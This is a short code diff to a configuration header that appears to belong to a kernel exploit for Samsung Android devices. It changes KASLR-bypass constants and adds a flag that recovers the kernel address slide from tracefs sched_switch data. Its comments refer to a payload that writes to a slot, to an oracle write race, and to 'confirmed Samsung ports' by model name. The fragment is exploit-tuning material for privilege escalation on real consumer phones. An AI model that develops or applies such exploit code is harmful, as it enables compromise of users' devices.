@@ -21,7 +21,7 @@
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d7ca0ULL
-#define SLIDE_PSELECT_WORD_SHIFT 2
+#define SLIDE_PSELECT_WORD_SHIFT 0
 
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
@@ -227,3 +227,9 @@
 
  * PI-tree geometry. Slot 0 is the only slot the non-diag FOPS payload
  * writes to (util.c:1899). Selecting any other slot reads an
+
+/* Use tracefs-based KASLR slide recovery. Every confirmed Samsung port
+ * (pa3q-S938N, dm3q, gts9, etc.) enables this. Reads sched_switch
+ * event data from /sys/kernel/tracing to derive the KASLR slide
+ * directly — no p0 oracle write race, no ret=0 window failures. */
+#define APP_TRACEFS_SLIDE 1
